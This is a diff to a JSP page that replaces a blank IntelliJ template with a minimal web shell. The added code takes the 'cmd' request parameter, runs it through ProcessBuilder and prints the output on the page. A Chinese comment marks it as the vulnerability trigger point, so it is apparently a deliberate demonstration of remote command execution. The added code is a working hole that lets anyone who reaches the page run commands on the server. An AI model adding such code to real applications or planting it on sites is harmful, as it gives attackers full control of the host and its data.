@@ -1,16 +1,18 @@
-<%--
-  Created by IntelliJ IDEA.
-  User: snowstorm-maxy
-  Date: 2025/9/30
-  Time: 13:04
-  To change this template use File | Settings | File Templates.
---%>
+<%@ page import="java.io.InputStream" %>
+<%@ page import="java.io.ByteArrayOutputStream" %>
 <%@ page contentType="text/html;charset=UTF-8" language="java" %>
-<html>
-  <head>
-    <title>$Title$</title>
-  </head>
-  <body>
-  $END$
-  </body>
-</html>
+<%
+    // 漏洞触发点
+    String cmd = request.getParameter("cmd");
+    InputStream in = new ProcessBuilder(cmd).start().getInputStream();
+
+    ByteArrayOutputStream results = new ByteArrayOutputStream();
+
+    int l = -1;
+    byte[] b = new byte[1024];
+    while ((l = in.read(b)) != -1) {
+        results.write(b, 0, l);
+    }
+
+    out.println(results);
+%>
